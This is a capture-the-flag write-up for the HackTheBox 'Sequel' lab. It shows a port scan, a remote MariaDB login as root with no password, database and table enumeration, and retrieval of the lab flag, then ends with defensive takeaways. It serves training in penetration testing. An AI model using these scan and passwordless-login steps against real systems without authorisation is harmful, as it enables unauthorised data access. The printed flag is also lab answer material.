# Sequel

This is a HackTheBox Starting Point lab for practicing database service enumeration, MySQL/MariaDB authentication testing, and database content review.

## Reconnaissance

Started with **RustScan** to identify open ports and services on the target.

```bash
target=10.129.124.202
rustscan --ulimit 5000 -a $target -- -sC -sV
```

RustScan identified one open port:

```text
3306/tcp open  mysql
```

The Nmap script output did not complete cleanly during this run, so the service version was confirmed after connecting to the database.

---

## MySQL Access

Connected to the MySQL service as `root` without providing a password:

```bash
mysql -h 10.129.124.202 -u root --skip-ssl
```

The login succeeded and opened a MariaDB shell:

```text
Welcome to the MariaDB monitor.
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
```

The `status` command confirmed the connection details:

```text
Current user:           root@10.10.14.78
SSL:                    Not in use
Server:                 MariaDB
Server version:         10.3.27-MariaDB-0+deb10u1 Debian 10
TCP port:               3306
```

This confirmed remote database access as the privileged `root` user.

---

## Database Enumeration

Listed available databases:

```sql
SHOW DATABASES;
```

Result:

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Selected the `htb` database:

```sql
USE htb;
```

Listed tables:

```sql
SHOW TABLES;
```

Result:

```text
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

---

## Flag Retrieval

Read the `config` table:

```sql
SELECT * FROM config;
```

The table contained application configuration values and the flag:

```text
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

Flag:

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## Attack Path

```text
RustScan
        ↓
MySQL Port Discovery
        ↓
Root Login Without Password
        ↓
MariaDB Version and Session Review
        ↓
Database Enumeration
        ↓
config Table Review
        ↓
Flag Retrieval
```

## Key Takeaways

* Database services should not be exposed externally unless there is a clear operational requirement.
* Remote `root` database access is a high-risk configuration.
* Empty, weak, or missing database passwords can lead directly to sensitive data exposure.
* SSL was not in use for the database session, meaning traffic was not protected at the transport layer.
* Basic database enumeration commands such as `SHOW DATABASES`, `SHOW TABLES`, and `SELECT` can quickly reveal sensitive information after authentication succeeds.
